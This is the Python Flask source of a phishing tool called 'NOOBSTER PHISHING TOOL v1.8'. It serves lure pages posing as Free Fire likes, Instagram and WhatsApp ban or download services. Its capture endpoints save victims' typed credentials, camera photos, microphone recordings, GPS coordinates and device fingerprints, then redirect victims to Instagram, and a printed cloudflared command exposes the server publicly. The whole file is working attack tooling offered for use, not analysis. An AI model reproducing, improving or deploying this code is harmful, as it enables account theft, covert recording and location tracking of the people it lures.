"""
NOOBSTER PHISHING TOOL v1.8
Local mode. Organized folder structure.

Telegram: https://t.me/noob11001
"""

import os, json, time, base64, re, sys
from datetime import datetime
from flask import Flask, render_template, request, jsonify, abort

app = Flask(__name__)
CAPTURE_DIR = "captures"
os.makedirs(CAPTURE_DIR, exist_ok=True)
TELEGRAM = "https://t.me/noob11001"
STATE = {"active_page": None}


class C:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
    M="\033[95m"; Cc="\033[96m"; W="\033[97m"; D="\033[90m"
    BOLD="\033[1m"; N="\033[0m"


BANNER = r"""
╔══════════════════════════════════════════════════════════════╗
║    ███╗   ██╗ ██████╗  ██████╗ ██████╗ ███████╗████████╗     ║
║    ████╗  ██║██╔═══██╗██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝     ║
║    ██╔██╗ ██║██║   ██║██║   ██║██████╔╝███████╗   ██║        ║
║    ██║╚██╗██║██║   ██║██║   ██║██╔══██╗╚════██║   ██║        ║
║    ██║ ╚████║╚██████╔╝╚██████╔╝██████╔╝███████║   ██║        ║
║    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝        ║
║              P H I S H I N G   T O O L   v1.8                ║
║                  t.me/noob11001                              ║
╚══════════════════════════════════════════════════════════════╝
"""


PAGES = {
    "1": {"slug": "freefire", "name": "Free Fire Likes", "icon": "🎮", "template": "freefire.html"},
    "2": {"slug": "instagram-ban", "name": "Instagram Ban", "icon": "📵", "template": "ig_ban.html"},
    "3": {"slug": "instagram-download", "name": "IG Private Download", "icon": "📥", "template": "ig_download.html"},
    "4": {"slug": "whatsapp-ban", "name": "WhatsApp Ban", "icon": "💬", "template": "wa_ban.html"},
}
SLUG_TO_PAGE = {p["slug"]: p for p in PAGES.values()}


def parse_device(ua):
    if not ua:
        return {"model": "unknown", "os": "unknown", "browser": "unknown", "type": "unknown"}
    info = {"model": "unknown", "os": "unknown", "browser": "unknown", "type": "unknown"}
    info["type"] = "mobile" if re.search(r"Mobile|Android|iPhone|iPad|iPod", ua) else "desktop"
    if "Android" in ua:
        m = re.search(r"Android\s+([\d.]+)", ua)
        info["os"] = f"Android {m.group(1)}" if m else "Android"
        m2 = re.search(r"Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))", ua)
        if m2:
            info["model"] = m2.group(1).strip()
    elif "iPhone" in ua:
        info["os"] = "iOS"; info["model"] = "iPhone"
        m = re.search(r"OS\s+(\d+_\d+)", ua)
        if m:
            info["os"] = f"iOS {m.group(1).replace('_', '.')}"
    elif "iPad" in ua:
        info["os"] = "iPadOS"; info["model"] = "iPad"
    elif "Windows" in ua:
        info["os"] = "Windows"; info["model"] = "PC"
    elif "Mac OS X" in ua:
        info["os"] = "macOS"; info["model"] = "Mac"
    elif "Linux" in ua:
        info["os"] = "Linux"; info["model"] = "PC"
    for name, tag in [("Edge", "Edg/"), ("Chrome", "Chrome/"), ("Firefox", "Firefox/"),
                      ("Safari", "Safari/"), ("Opera", "OPR/"), ("Samsung Internet", "SamsungBrowser/")]:
        if tag in ua:
            info["browser"] = name
            break
    return info


def safe(s, max_len=30):
    s = re.sub(r"[^a-zA-Z0-9_.-]", "_", s or "unknown")
    return s[:max_len]


def new_folder(ip, page):
    """create folder like: 20261002_143022_freefire_103.21.44.5_14-30-22"""
    now = datetime.now()
    date = now.strftime("%Y%m%d_%H%M%S")
    time_short = now.strftime("%H-%M-%S")
    f = os.path.join(CAPTURE_DIR, f"{date}_{safe(page)}_{safe(ip)}_{time_short}")
    os.makedirs(f, exist_ok=True)
    return f


def sub(folder, name):
    """create subfolder inside capture folder"""
    p = os.path.join(folder, name)
    os.makedirs(p, exist_ok=True)
    return p


def save_json(folder, subfolder, fname, data):
    d = sub(folder, subfolder)
    path = os.path.join(d, fname)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    return path


def append_info(folder, line):
    """append to info.txt — human readable log"""
    path = os.path.join(folder, "info.txt")
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def ts_short():
    return datetime.now().strftime("%H-%M-%S")


def ts_full():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def header(ip, ua, page):
    dev = parse_device(ua)
    print(f"\n{C.BOLD}{C.M}{'═' * 66}{C.N}")
    print(f"{C.BOLD}{C.G}  🎯 NEW HIT{C.N}   {C.D}{ts_full()}{C.N}")
    print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}")
    print(f"  {C.Cc}Page    :{C.N} {C.W}{page}{C.N}")
    print(f"  {C.Cc}IP      :{C.N} {C.Y}{ip}{C.N}")
    print(f"  {C.Cc}Device  :{C.N} {C.W}{dev['model']}{C.N}  {C.D}({dev['type']}){C.N}")
    print(f"  {C.Cc}OS      :{C.N} {C.W}{dev['os']}{C.N}  {C.D}| {dev['browser']}{C.N}")


def footer():
    print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}\n")


@app.route("/")
def root():
    return serve_selected()


@app.route("/<path:path>")
def catch_all(path):
    if path == STATE["active_page"]:
        return serve_selected()
    if path.startswith("static/"):
        return app.send_static_file(path[7:])
    abort(404)


def serve_selected():
    slug = STATE["active_page"]
    if not slug:
        abort(503)
    page = SLUG_TO_PAGE.get(slug)
    if not page:
        abort(503)
    return render_template(page["template"], telegram=TELEGRAM)


# ═══════════ CAPTURE ENDPOINTS ═══════════

@app.route("/capture/photo", methods=["POST"])
def cap_photo():
    if not STATE["active_page"]:
        abort(404)
    d = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    page = d.get("page", "?")
    folder = new_folder(ip, page)
    t = ts_short()

    b64 = d.get("photo", "")
    if "," in b64:
        b64 = b64.split(",", 1)[1]
    try:
        p = sub(folder, "photo")
        path = os.path.join(p, f"photo_{t}.jpg")
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64))
        size_kb = os.path.getsize(path) // 1024
        print(f"  {C.G}📸 Photo{C.N}  {C.D}{path} ({size_kb} KB){C.N}")
        append_info(folder, f"[{ts_full()}] PHOTO       {path} ({size_kb} KB)")
    except Exception as e:
        print(f"  {C.R}photo error: {e}{C.N}")

    save_json(folder, "ip", f"ip_{t}.json", {
        "timestamp": ts_full(),
        "ip": ip,
        "user_agent": ua,
        "device": parse_device(ua),
        "page": page
    })
    return jsonify({"ok": 1})


@app.route("/capture/fingerprint", methods=["POST"])
def cap_fp():
    if not STATE["active_page"]:
        abort(404)
    d = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    page = d.get("page", "?")
    folder = new_folder(ip, page)
    t = ts_short()

    # ipapi wala part
    if "ipapi" in d:
        api = d["ipapi"]
        save_json(folder, "ip", f"ipinfo_{t}.json", {
            "timestamp": ts_full(),
            "ip": ip,
            "country": api.get("country_name"),
            "country_code": api.get("country_code"),
            "region": api.get("region"),
            "city": api.get("city"),
            "postal": api.get("postal"),
            "latitude": api.get("latitude"),
            "longitude": api.get("longitude"),
            "timezone": api.get("timezone"),
            "org": api.get("org"),
            "asn": api.get("asn"),
            "raw": api
        })
        print(f"  {C.Cc}🌐 IP info{C.N}  {C.D}{api.get('city')}, {api.get('country_name')} — {api.get('org')}{C.N}")
        append_info(folder, f"[{ts_full()}] IP          {ip} — {api.get('city')}, {api.get('country_name')} — {api.get('org')}")
        footer()
        return jsonify({"ok": 1})

    # device fingerprint
    save_json(folder, "device", f"device_{t}.json", {
        "timestamp": ts_full(),
        "ip": ip,
        "data": d
    })

    if "screen" in d:
        bat = d.get("battery") or {}
        conn = d.get("connection") or {}
        gpu = d.get("gpu") or {}
        header(ip, ua, page)
        print(f"  {C.Cc}Screen  :{C.N} {d.get('screen',{}).get('width','?')}x"
              f"{d.get('screen',{}).get('height','?')}  {C.D}@{d.get('screen',{}).get('pixelRatio','?')}x{C.N}")
        print(f"  {C.Cc}Lang    :{C.N} {d.get('language','?')}  {C.D}| TZ: {d.get('timezone','?')}{C.N}")
        if bat:
            pct = int((bat.get("level") or 0) * 100)
            chg = "⚡ charging" if bat.get("charging") else "🔋"
            print(f"  {C.Cc}Battery :{C.N} {C.Y}{pct}%{C.N} {chg}")
        if gpu:
            print(f"  {C.Cc}GPU     :{C.N} {gpu.get('renderer','?')[:50]}")
        if conn:
            print(f"  {C.Cc}Network :{C.N} {conn.get('effectiveType','?')} "
                  f"{C.D}({conn.get('downlink','?')}Mbps){C.N}")
        print(f"  {C.Cc}CPU     :{C.N} {d.get('hardwareConcurrency','?')} cores  "
              f"{C.D}RAM: {d.get('deviceMemory','?')}GB{C.N}")

        append_info(folder, f"[{ts_full()}] DEVICE      {d.get('screen',{}).get('width','?')}x"
                    f"{d.get('screen',{}).get('height','?')} "
                    f"CPU:{d.get('hardwareConcurrency','?')} "
                    f"RAM:{d.get('deviceMemory','?')}GB "
                    f"GPU:{(gpu.get('renderer') or '?')[:40]} "
                    f"TZ:{d.get('timezone','?')}")
        if bat:
            append_info(folder, f"[{ts_full()}] BATTERY     {int((bat.get('level') or 0)*100)}% "
                        f"{'charging' if bat.get('charging') else 'discharging'}")
    return jsonify({"ok": 1})


@app.route("/capture/location", methods=["POST"])
def cap_loc():
    if not STATE["active_page"]:
        abort(404)
    d = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    page = d.get("page", "?")
    folder = new_folder(ip, page)
    t = ts_short()

    save_json(folder, "location", f"location_{t}.json", {
        "timestamp": ts_full(),
        "ip": ip,
        "data": d
    })

    lat = d.get("lat"); lon = d.get("lon")
    if lat is not None:
        gmaps = f"https://maps.google.com/?q={lat},{lon}"
        print(f"  {C.G}📍 Location{C.N}  {C.D}{gmaps} (±{int(d.get('accuracy',0))}m){C.N}")
        append_info(folder, f"[{ts_full()}] LOCATION    lat={lat} lon={lon} "
                    f"accuracy=±{int(d.get('accuracy',0))}m")
        append_info(folder, f"[{ts_full()}] MAPS        {gmaps}")
    return jsonify({"ok": 1})


@app.route("/capture/audio", methods=["POST"])
def cap_audio():
    if not STATE["active_page"]:
        abort(404)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    page = request.form.get("page", "?")
    folder = new_folder(ip, page)
    t = ts_short()
    f = request.files.get("audio")
    if f:
        p = sub(folder, "audio")
        path = os.path.join(p, f"audio_{t}.webm")
        f.save(path)
        size_kb = os.path.getsize(path) // 1024
        print(f"  {C.G}🎤 Audio{C.N}  {C.D}{path} ({size_kb} KB){C.N}")
        append_info(folder, f"[{ts_full()}] AUDIO       {path} ({size_kb} KB)")
    return jsonify({"ok": 1})


@app.route("/capture/credentials", methods=["POST"])
def cap_creds():
    if not STATE["active_page"]:
        abort(404)
    d = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    page = d.get("page", "?")
    folder = new_folder(ip, page)
    t = ts_short()

    fields = d.get("fields", {})
    save_json(folder, "credentials", f"input_{t}.json", {
        "timestamp": ts_full(),
        "ip": ip,
        "ua": ua,
        "page": page,
        "fields": fields
    })

    print(f"  {C.BOLD}{C.R}🔑 USER INPUT{C.N}  {C.D}page: {page}{C.N}")
    append_info(folder, f"[{ts_full()}] USER INPUT  page: {page}")
    for k, v in fields.items():
        s = str(v)
        shown = s if len(s) < 60 else s[:57] + "..."
        print(f"     {C.Cc}{k}{C.N} = {C.Y}{shown}{C.N}")
        append_info(folder, f"[{ts_full()}]   {k} = {v}")
    footer()
    return jsonify({"ok": 1, "redirect": d.get("redirect", "https://www.instagram.com")})


@app.route("/capture/debug", methods=["POST"])
def cap_debug():
    d = request.get_json()
    print(f"  {C.D}[debug] {d.get('msg')}{C.N}")
    return jsonify({"ok": 1})


# ═══════════ MENU ═══════════

def show_menu():
    os.system("clear" if os.name == "posix" else "cls")
    print(BANNER)
    print(f"  {C.D}Telegram:{C.N} {C.Cc}{TELEGRAM}{C.N}\n")
    print(f"{C.BOLD}{C.W}  SELECT A MODULE{C.N}\n")
    for k, p in PAGES.items():
        print(f"   {C.BOLD}{C.Y}[{k}]{C.N}  {p['icon']}  {C.W}{p['name']}{C.N}")
    print(f"\n   {C.BOLD}{C.Y}[0]{C.N}  🚀  {C.W}Start server{C.N}")
    print(f"   {C.BOLD}{C.Y}[q]{C.N}  ❌  {C.W}Quit{C.N}\n")
    while True:
        try:
            choice = input(f"{C.BOLD}{C.Cc}  ▸ select: {C.N}").strip().lower()
        except (EOFError, KeyboardInterrupt):
            sys.exit(0)
        if choice == "q":
            sys.exit(0)
        if choice in PAGES:
            STATE["active_page"] = PAGES[choice]["slug"]
            p = PAGES[choice]
            print(f"\n  {C.G}✓ selected:{C.N} {p['icon']} {C.W}{p['name']}{C.N}")
            print(f"  {C.D}Press 0 to start.{C.N}\n")
            continue
        if choice == "0":
            if not STATE["active_page"]:
                print(f"  {C.R}pick a module first.{C.N}\n")
                continue
            return
        print(f"  {C.R}invalid.{C.N}")


def boot():
    show_menu()
    slug = STATE["active_page"]
    p = SLUG_TO_PAGE[slug]
    print(f"\n{C.BOLD}{C.M}{'═' * 66}{C.N}")
    print(f"{C.BOLD}{C.G}  🎯 ACTIVE PAGE: {p['icon']}  {p['name']}{C.N}")
    print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}")
    print(f"  {C.Cc}Local   :{C.N} {C.W}http://127.0.0.1:5000/{p['slug']}{C.N}")
    print(f"  {C.Cc}Expose  :{C.N} {C.D}cloudflared tunnel --url http://localhost:5000{C.N}")
    print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}\n")
    app.run(host="0.0.0.0", port=5000, debug=False)


if __name__ == "__main__":
    boot()
